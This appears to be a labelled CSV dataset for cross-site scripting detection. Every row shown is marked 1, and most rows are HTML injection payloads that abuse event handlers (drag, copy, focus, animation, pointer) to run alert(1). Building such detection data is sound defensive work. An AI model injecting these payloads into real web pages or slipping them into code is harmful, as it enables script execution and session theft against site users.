Sentence,Label
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",1
"<sup onpaste=""alert(1)"" contenteditable>test</sup>",1
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>",1
"<dt onbeforepaste=""alert(1)"" contenteditable>test</dt>",1
"<object draggable=""true"" ondragleave=""alert(1)"">test</object>",1
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",1
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",1
"<canvas onclick=""alert(1)"">test</canvas>",1
<image src/onerror=alert(1)>,1
<form onreset=alert(1)><input type=reset>,1
"<menu onbeforepaste=""alert(1)"" contenteditable>test</menu>",1
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",1
"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",1
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationend=""alert(1)""></dd>",1
"<meta oncut=""alert(1)"" contenteditable>test</meta>",1
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",1
"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></style>",1
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,1
<svg><nextid onload=alert(1)></nextid>,1
<i onpointerdown=alert(1)>XSS</i>,1
"<cite oncut=""alert(1)"" contenteditable>test</cite>",1
"<samp draggable=""true"" ondrag=""alert(1)"">test</samp>",1
"<style>:target {transform: rotate(180deg);}</style><select id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></select>",1
"<th oncut=""alert(1)"" contenteditable>test</th>",1
<a id=x tabindex=1 onfocusin=alert(1)></a>,1
"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>",1
<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>,1
<STYLE>@import'http://.rocks/.css';</STYLE>,1
"<tfoot oncopy=""alert(1)"" contenteditable>test</tfoot>",1
"<select onbeforecut=""alert(1)"" contenteditable>test</select>",1
"<ins oncopy=""alert(1)"" contenteditable>test</ins>",1
"<mark draggable=""true"" ondrag=""alert(1)"">test</mark>",1
"<tbody draggable=""true"" ondragend=""alert(1)"">test</tbody>",1
"<spacer oncut=""alert(1)"" contenteditable>test</spacer>",1
"<summary oncopy=""alert(1)"" contenteditable>test</summary>",1
"<image onmousemove=""alert(1)"">test</image>",1
<nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>,1
<script id=x tabindex=1 onfocus=alert(1)></script>,1
document.documentElement.nodeName,1
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",1
"<strike draggable=""true"" ondragend=""alert(1)"">test</strike>",1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",1
<script id=x tabindex=1 onfocusin=alert(1)></script>,1
"<multicol onmouseover=""alert(1)"">test</multicol>",1
"<sup draggable=""true"" ondrag=""alert(1)"">test</sup>",1
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,1
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,1
"<area draggable=""true"" ondragleave=""alert(1)"">test</area>",1
<frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>,1
<image onpointermove=alert(1)>XSS</image>,1
<small id=x tabindex=1 onfocus=alert(1)></small>,1
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationstart=""alert(1)""></datalist>",1
"<IMG SRC=""livescript:[code]"">",1
<button autofocus onfocusin=alert(1)>test</button>,1
"<bdo draggable=""true"" ondrag=""alert(1)"">test</bdo>",1
"document.querySelector("""")",1
"<menuitem draggable=""true"" ondragleave=""alert(1)"">test</menuitem>",1
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,1
<dir id=x tabindex=1 onbeforedeactivate=alert(1)></dir><input autofocus>,1
"<body onmouseout=""alert(1)"">test</body>",1
"AllowScriptAccess=""always""",1
"<style>:target {color: red;}</style><keygen id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></keygen>",1
"<s onmouseenter=""alert(1)"">test</s>",1
"<title onpaste=""alert(1)"" contenteditable>test</title>",1
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",1
"<font draggable=""true"" ondrag=""alert(1)"">test</font>",1
"<dl onkeypress=""alert(1)"" contenteditable>test</dl>",1
<main onpointerup=alert(1)>XSS</main>,1
<tr onpointermove=alert(1)>XSS</tr>,1
"<br draggable=""true"" ondragenter=""alert(1)"">test</br>",1
"<style>@keyframes x{}</style><q style=""animation-name:x"" onanimationend=""alert(1)""></q>",1
"<i draggable=""true"" ondragenter=""alert(1)"">test</i>",1
"<article oncopy=""alert(1)"" contenteditable>test</article>",1
"<aside oncut=""alert(1)"" contenteditable>test</aside>",1
"<style>:target {color: red;}</style><command id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></command>",1
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationend=""alert(1)""></frameset>",1
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>",1
<canvas onpointerup=alert(1)>XSS</canvas>,1
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",1
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,1
